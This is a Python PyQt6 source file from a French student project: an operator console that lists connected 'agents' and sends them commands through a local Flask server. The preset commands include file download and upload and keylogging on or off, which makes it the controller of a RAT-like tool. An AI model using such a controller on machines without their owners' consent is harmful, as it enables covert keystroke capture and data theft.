# /**********************************************************************************************************************************************************************************

# Nom du fichier : GUI.py
# Rôle du fichier : Il gère le lancement de l'interface graphique et s'occupe de lancer le server.

# Auteur : Maxime BRONNY
# Version : V1
# Licence : Réalisé dans le cadre des cours "PROJET TUTEURE" L3 INFORMATIQUE IED
# Usage : LANCEMENT DE L'INTERFACE GRAPHIQUE et du fichier server.py : 
          
#               - python3 GUI.py
              
# *********************************************************************************************************************************************************************************/


# =============================================================================
# Importation des bibliothèques nécessaires
# =============================================================================

import sqlite3      # Pour gérer la base de données SQLite (stockage des informations des agents, sessions, etc.)
import sys          # Pour accéder aux arguments du script et gérer l'environnement d'exécution
import time         # Pour la gestion des délais, temporisations et timestamps
import socket       # Pour vérifier l'état des ports réseau (ex : vérifier si le serveur est actif)
import subprocess   # Pour lancer des processus externes (ex : démarrer le serveur si besoin)
import psutil       # Pour surveiller et gérer les processus système (ex : vérifier si le serveur tourne déjà)
import requests     # Pour effectuer des requêtes HTTP (ex : ping du serveur Flask pour vérifier son état)

from PyQt6.QtWidgets import (
    QApplication,                # Classe principale de l'application Qt
    QWidget,                     # Widget de base pour toutes les interfaces
    QVBoxLayout,                 # Layout vertical pour organiser les widgets
    QHBoxLayout,                 # Layout horizontal pour organiser les widgets
    QTableWidget,                # Tableau interactif pour afficher des données tabulaires
    QTableWidgetItem,            # Élément individuel d'un QTableWidget
    QLabel,                      # Widget pour afficher du texte ou des images
    QPushButton,                 # Bouton cliquable
    QLineEdit,                   # Champ de saisie de texte sur une ligne
    QComboBox,                   # Liste déroulante pour sélectionner une option
    QTextEdit,                   # Champ de saisie de texte multi-lignes
    QSpinBox,                    # Champ de sélection de nombre entier avec flèches
    QGroupBox,                   # Boîte de regroupement de widgets avec un titre
    QScrollBar,                  # Barre de défilement verticale ou horizontale
    QGraphicsDropShadowEffect    # Effet graphique d'ombre portée
)

from PyQt6.QtCore import QTimer, QDateTime   # Pour la gestion des minuteries et des dates/heures dans l'interface
from PyQt6.QtGui import QColor               # Pour la gestion des couleurs (ex : effets graphiques, ombres)


# =============================================================================
# Paramètres et constantes
# =============================================================================

SERVER = "server.py"
DB_PATH = "test.db"
LOCALHOST = '127.0.0.1'
PORT = 5000

# =============================================================================
# Fonctions utilitaires
# =============================================================================

def is_port_open(host, port):
    """Vérifie si un port est ouvert sur l'hôte spécifié."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        return s.connect_ex((host, port)) == 0

def launch_server():
    """Lance le serveur Flask s'il n'est pas déjà en route."""
    if not is_port_open(LOCALHOST, PORT):
        print("Serveur non détecté. Lancement du serveur...")
        subprocess.Popen([sys.executable, SERVER])
        time.sleep(2)
        print("Serveur maintenant actif.")
        
        # Ajout pour activer le serveur Flask via une requête HTTP
        try:
            requests.get(f"http://{LOCALHOST}:{PORT}/")
        except Exception:
            pass

    else:
        print("Serveur déjà actif.")

def applyDropShadow(widget):
    """
    Applique un effet d'ombre portée sur le widget fourni.
    L'effet a un flou de 10, une couleur noire semi‑transparente et un décalage de 2 pixels.
    """
    shadow = QGraphicsDropShadowEffect()
    shadow.setBlurRadius(10)
    shadow.setColor(QColor(0, 0, 0, 160))
    shadow.setOffset(2, 2)
    widget.setGraphicsEffect(shadow)

# =============================================================================
# Nouvelle fenêtre TeamViewer
# =============================================================================

class TeamViewerWindow(QWidget):
    def __init__(self, agent_id):
        super().__init__()
        self.agent_id = agent_id
        self.setWindowTitle(f"TeamViewer - Connexion avec Agent {agent_id}")
        self.setGeometry(300, 300, 800, 600)
        layout = QVBoxLayout()
        info_label = QLabel(f"Connexion TeamViewer en cours vers l'agent ID {agent_id}")
        info_label.setStyleSheet("font-weight: bold; font-size: 16pt; color: #dcdcdc;")
        layout.addWidget(info_label)
        disconnect_btn = QPushButton("Disconnect")
        disconnect_btn.clicked.connect(self.close)
        applyDropShadow(disconnect_btn)
        layout.addWidget(disconnect_btn)
        self.setLayout(layout)

# =============================================================================
# Interface principale
# =============================================================================

class ServerGUI(QWidget):
    def __init__(self):
        super().__init__()

        # Configuration initiale de la fenêtre principale
        self.setWindowTitle("Serveur de contrôle")
        self.setGeometry(200, 200, 1000, 800)
        self.server_process = None

        # Layout principal vertical
        main_layout = QVBoxLayout()

        # -------------------------------------------------------
        # Section 1 : En-tête "Statut du serveur"
        # -------------------------------------------------------
        header_group = QGroupBox("Statut du serveur")
        header_layout = QHBoxLayout()
        
        self.server_status_label = QLabel("Statut du serveur : inconnu")
        self.server_status_label.setStyleSheet("font-weight: bold;")
        self.update_label = QLabel("Dernière mise à jour : -")
        self.status_label = QLabel("")  # Exemple : "Interface connectée"
        self.status_label.setStyleSheet("font-style: italic;")
        self.restart_server_btn = QPushButton("Relancer le serveur")
        self.restart_server_btn.clicked.connect(self.relancer_serveur)
        applyDropShadow(self.restart_server_btn)
        
        header_layout.addWidget(self.server_status_label)
        header_layout.addWidget(self.update_label)
        header_layout.addWidget(self.status_label)
        header_layout.addStretch()
        header_layout.addWidget(self.restart_server_btn)
        header_group.setLayout(header_layout)
        main_layout.addWidget(header_group)

        # -------------------------------------------------------
        # Section 2 : Liste des agents connectés (Tableau)
        # -------------------------------------------------------
        agents_group = QGroupBox("Agents connectés")
        agents_layout = QVBoxLayout()
        
        # On passe de 4 à 5 colonnes pour ajouter la colonne "TeamViewer"
        self.table = QTableWidget()
        self.table.setColumnCount(5)
        self.table.setHorizontalHeaderLabels(["ID", "IP", "INFO", "Statut", "TeamViewer"])
        self.table.setMinimumSize(750, 400)
        self.table.setColumnWidth(0, 25)
        self.table.setColumnWidth(1, 200)
        self.table.setColumnWidth(2, 550)
        self.table.setColumnWidth(3, 75)
        self.table.setColumnWidth(4, 125)
        
        agents_layout.addWidget(self.table)
        agents_group.setLayout(agents_layout)
        main_layout.addWidget(agents_group)
        
        # -------------------------------------------------------
        # Section 3 : Commandes et actions sur les agents
        # -------------------------------------------------------
        actions_group = QGroupBox("Actions")
        actions_layout = QVBoxLayout()
        
        # Ligne 1 : Sélection d'agent et menu déroulant de commandes préenregistrées
        select_layout = QHBoxLayout()
        self.agent_label = QLabel("Sélectionnez un agent :")
        self.agent_select = QComboBox()
        select_layout.addWidget(self.agent_label)
        select_layout.addWidget(self.agent_select)
        
        preset_command_label = QLabel("Sélectionner une commande :")
        self.preset_command_combo = QComboBox()
        # Mise à jour de la liste des commandes préenregistrées
        self.preset_command_combo.addItems([
            "",
            "TEST",
            "download <nom_fichier>",
            "upload <nom_fichier> <taille>",
            "keylog on",
            "keylog off",
            "quit"
        ])
        self.preset_command_combo.currentIndexChanged.connect(self.updateCommandInputFromPreset)
        select_layout.addWidget(preset_command_label)
        select_layout.addWidget(self.preset_command_combo)
        select_layout.addStretch()
        actions_layout.addLayout(select_layout)
        
        # Ligne 2 : Zone de saisie de commande
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Entrez une commande...")
        actions_layout.addWidget(self.command_input)
        
        # Ligne 3 : Boutons d'envoi de commande
        buttons_layout = QHBoxLayout()
        self.send_command_btn = QPushButton("Envoyer commande à un agent")
        self.send_command_btn.clicked.connect(self.envoyer_commande_agent)
        applyDropShadow(self.send_command_btn)
        self.send_command_all_btn = QPushButton("Envoyer commande à tous")
        self.send_command_all_btn.clicked.connect(self.envoyer_commande_tous)
        applyDropShadow(self.send_command_all_btn)
        buttons_layout.addWidget(self.send_command_btn)
        buttons_layout.addWidget(self.send_command_all_btn)
        actions_layout.addLayout(buttons_layout)
        
        # Ligne 4 : Zone d'affichage des retours
        self.command_output = QTextEdit()
        self.command_output.setReadOnly(True)
        actions_layout.addWidget(self.command_output)
        
        actions_group.setLayout(actions_layout)
        main_layout.addWidget(actions_group)
        
        # -------------------------------------------------------
        # Section 4 : Paramètres d'actualisation
        # -------------------------------------------------------
        refresh_layout = QHBoxLayout()
        refresh_layout.addWidget(QLabel("Actualisation (sec) :"))
        self.refresh_spinbox = QSpinBox()
        self.refresh_spinbox.setRange(2, 30)
        self.refresh_spinbox.setValue(5)
        self.refresh_spinbox.valueChanged.connect(self.change_refresh_rate)
        refresh_layout.addWidget(self.refresh_spinbox)
        refresh_layout.addStretch()
        main_layout.addLayout(refresh_layout)

        self.setLayout(main_layout)

        # -------------------------------------------------------
        # Initialisation du timer d'actualisation
        # -------------------------------------------------------
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.actualiser)
        self.timer.start(5000)  # Actualisation toutes les 5 secondes

        # Chargement initial des données et vérification du serveur
        self.verifier_et_lancer_serveur()
        self.charger_donnees()

    # =============================================================================
    # Fonctions utilitaires pour mettre a jour des commandes préenregistrées
    # =============================================================================
    
    def updateCommandInputFromPreset(self):
        """
        Met à jour le contenu de la zone de saisie de commande à partir de la commande préenregistrée sélectionnée.
        """
        preset_command = self.preset_command_combo.currentText()
        if preset_command:
            self.command_input.setText(preset_command)

    # =============================================================================
    # Fonctions utilitaires pour actualiser les données serveur et agents et redémarrer le serveur si besoin
    # =============================================================================

    def actualiser(self):
        """Actualise le statut du serveur et recharge la liste des agents."""
        self.verifier_et_lancer_serveur(update_only=True)
        self.charger_donnees()

    # =============================================================================
    # Fonctions utilitaires pour vérifier le statut du serveur et le lancer
    # =============================================================================

    def verifier_et_lancer_serveur(self, update_only=False):
        """
        Vérifie si le serveur est actif en testant le port.
        Affiche le statut en vert si actif, sinon en rouge.
        Si aucun serveur n'est trouvé et que 'update_only' est False, lance le serveur.
        """
        if is_port_open(LOCALHOST, PORT):
            self.server_status_label.setText("Statut du serveur : actif")
            self.server_status_label.setStyleSheet("color: green")
        else:
            self.server_status_label.setText("Statut du serveur : inactif")
            self.server_status_label.setStyleSheet("color: red")
            if not update_only:
                launch_server()

    # =============================================================================
    # Fonctions utilitaires pour relancer le serveur
    # =============================================================================

    def relancer_serveur(self):
        """Relance manuellement le serveur."""
        print("Relance manuelle du serveur...")
        for p in psutil.process_iter():
            try:
                if SERVER in p.cmdline():
                    p.kill()
            except psutil.ZombieProcess:
                pass
            except FileNotFoundError:
                pass
            except Exception as e:
                print(f"Erreur lors de la gestion du processus {p.pid}: {e}")
        time.sleep(3)
        print("Attente de 3 secondes pour laisser le serveur s'éteindre...")
        self.verifier_et_lancer_serveur()

    # =============================================================================
    # Fonctions utilitaires pour mettre a jour l'intervalle du timer
    # =============================================================================

    def change_refresh_rate(self):
        """Met à jour l'intervalle du timer en fonction de la valeur du QSpinBox."""
        new_interval = self.refresh_spinbox.value() * 1000
        self.timer.setInterval(new_interval)

    # =============================================================================
    # Fonctions utilitaires pour charger les données des agents
    # =============================================================================

    def charger_donnees(self):
        """
        Charge les données des agents depuis la base et met à jour l'interface.
        En cas d'erreur, affiche un message et vide le tableau.
        """
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute("SELECT ID, Ip, Info, State FROM Agents")
            rows = cursor.fetchall()
            conn.close()
        except Exception as e:
            self.status_label.setText(f"\u274C Erreur de connexion : {str(e)}")
            self.status_label.setStyleSheet("color: red;")
            self.table.setRowCount(0)
            return

        self.update_label.setText("Dernière mise à jour : " +
                                  QDateTime.currentDateTime().toString("hh:mm:ss"))
        self.status_label.setText("\u2705 Interface connectée")
        self.status_label.setStyleSheet("color: green;")
        self.table.setRowCount(len(rows))
        self.agent_select.clear()
        # Mise à jour du QComboBox à partir des agents en ligne
        for (ID, Ip, _, State) in rows:
            if State.lower() == "online":
                self.agent_select.addItem(f"{ID} - {Ip}", userData=ID)

        # Remplissage du tableau avec 5 colonnes
        for i, (ID, Ip, Info, State) in enumerate(rows):
            self.table.setItem(i, 0, QTableWidgetItem(str(ID)))
            self.table.setItem(i, 1, QTableWidgetItem(Ip))
            self.table.setItem(i, 2, QTableWidgetItem(Info))
            item_state = QTableWidgetItem(State)
            if State.lower() == "online":
                item_state.setForeground(QColor("green"))
            else:
                item_state.setForeground(QColor("red"))
            self.table.setItem(i, 3, item_state)

            # Colonne 5 : Bouton "Executer" pour TeamViewer
            teamviewer_btn = QPushButton("Executer")
            if State.lower() != "offline":
                teamviewer_btn.setEnabled(False)
            # Le lambda capture l'ID de l'agent
            teamviewer_btn.clicked.connect(lambda checked, agent_id=ID: self.executeTeamviewerForAgent(agent_id))
            applyDropShadow(teamviewer_btn)
            self.table.setCellWidget(i, 4, teamviewer_btn)


    # =============================================================================
    # Fonctions utilitaires pour envoyer une commande à un agent spécifique
    # =============================================================================

    def envoyer_commande_agent(self):
        """
        Envoie une commande à un agent spécifique via une requête HTTP POST.
        Réinitialise la case de saisie après l'envoi.
        """
        text = self.agent_select.currentText()
        if " - " not in text:
            self.command_output.setText("\u274C Sélection invalide.")
            return
        agent_id = text.split(" - ")[0].strip()
        commande = self.command_input.text().strip()
        if not agent_id or not commande:
            self.command_output.setText("\u274C Sélectionnez un agent et entrez une commande !")
            return
        url = f"http://127.0.0.1:5000/{agent_id}/execute"
        data = {"command": commande}
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                self.command_output.setText(
                    f"\u2705 Commande envoyée à {agent_id} : {commande}\nRéponse : {response.text}"
                )
            else:
                self.command_output.setText(
                    f"\u274C Erreur {response.status_code} : {response.text}"
                )
        except Exception as e:
            self.command_output.setText(f"\u274C Erreur de connexion : {e}")
        finally:
            # Réinitialisation de la zone de commande
            self.command_input.clear()


# =============================================================================
# Fonctions utilitaires pour envoyer une commande à tous les agents
# =============================================================================

    def envoyer_commande_tous(self):
        """
        Envoie une commande à tous les agents via une requête HTTP POST.
        Réinitialise la case de saisie après l'envoi.
        """
        commande = self.command_input.text().strip()
        if not commande:
            self.command_output.setText("\u274C Entrez une commande à exécuter sur tous les agents !")
            return
        url = "http://127.0.0.1:5000/allinone/executeall"
        data = {"command": commande}
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                self.command_output.setText(
                    f"\u2705 Commande envoyée à tous les agents : {commande}\nRéponse : {response.text}"
                )
            else:
                self.command_output.setText(
                    f"\u274C Erreur {response.status_code} : {response.text}"
                )
        except Exception as e:
            self.command_output.setText(f"\u274C Erreur de connexion : {e}")
        finally:
            # Réinitialisation de la zone de commande
            self.command_input.clear()

    # =============================================================================
    # Fonctions utilitaires pour exécuter TeamViewer pour un agent spécifique ( Fonctionnalité non utilisée a développer )
    # =============================================================================

    def executeTeamviewerForAgent(self, agent_id):
        """Ouvre une nouvelle fenêtre TeamViewer pour l'agent spécifié."""
        self.teamviewer_window = TeamViewerWindow(agent_id)
        self.teamviewer_window.show()


# =======================================================================================================================
# Fonction principale pour lancer l'application
# Thème de l'application customisé ( dark_blue_elegant ) basé sur le thème de l'application Copilot de Microsoft
# =======================================================================================================================

if __name__ == '__main__':
    app = QApplication(sys.argv)

    theme_choice = "dark_blue_elegant"

    if theme_choice == "dark_blue_elegant":
        app.setStyle("Fusion")
        app.setStyleSheet("""
            /* Fond général et typographie */
            QWidget {
                background-color: #1e1e1e;
                color: #dcdcdc;
                font-family: "Segoe UI", sans-serif;
                font-size: 12pt;
                padding: 4px;
            }
            /* Boutons modifiés avec un dégradé amélioré basé sur #5CC6FF */
            QPushButton {
                background: qlineargradient(
                    x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #C2F0FF, stop: 0.5 #A0DDFF, stop: 1 #5CC6FF
                );
                color: #1e1e1e;
                border: 1px solid #5CC6FF;
                border-radius: 5px;
                padding: 5px 10px;
            }
            QPushButton:hover {
                background: qlineargradient(
                    x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #D0F4FF, stop: 0.5 #B0E3FF, stop: 1 #70DAFF
                );
                color: #000000;
            }
            QPushButton:pressed {
                background: qlineargradient(
                    x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #90C7E0, stop: 0.5 #7BB6D0, stop: 1 #689EBE
                );
                border-style: inset;
            }
            /* Champs de saisie et autres éléments interactifs */
            QLineEdit, QTextEdit, QComboBox, QSpinBox, QTableWidget {
                background-color: #262626;
                color: #dcdcdc;
                border: 1px solid #3a3a3a;
                selection-background-color: #3a81c3;
            }
            QLineEdit:focus, QTextEdit:focus, QComboBox:focus, QSpinBox:focus {
                border: 1px solid #3a81c3;
            }
            /* Table : lignes alternées, gridlines et style de sélection */
            QTableWidget {
                alternate-background-color: #2d2d2d;
                gridline-color: #444444;
            }
            QTableWidget::item:selected {
                background-color: #3a81c3;
                color: #ffffff;
            }
            /* En-têtes du tableau avec dégradé subtil */
            QHeaderView::section {
                background: qlineargradient(
                    x1: 0, y1: 0, x2: 0, y2: 1,
                    stop: 0 #2e2e2e, stop: 1 #1e1e1e
                );
                color: #3a81c3;
                padding: 4px;
                border: 1px solid #3a3a3c;
            }
            /* Personnalisation du QComboBox */
            QComboBox::drop-down {
                border-left: 1px solid #3a81c3;
            }
            QComboBox::down-arrow {
                image: url(:/icons/arrow-down.png);
                width: 10px;
                height: 10px;
            }
            /* Scrollbar personnalisée */
            QScrollBar:vertical {
                background: #2e2e2e;
                width: 12px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #3a3a3a;
                min-height: 20px;
                border-radius: 5px;
            }
            QScrollBar::handle:vertical:hover {
                background: #3a81c3;
            }
            QScrollBar::add-line:vertical,
            QScrollBar::sub-line:vertical,
            QScrollBar::add-page:vertical,
            QScrollBar::sub-page:vertical {
                background: none;
            }
            /* Amélioration des QGroupBox pour centrer les titres */
            QGroupBox {
                margin-top: 20px;
                padding: 10px;
                border: 1px solid #444444;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 5px;
                color: #3a81c3;
            }
        """)
    gui = ServerGUI()
    gui.show()
    sys.exit(app.exec())
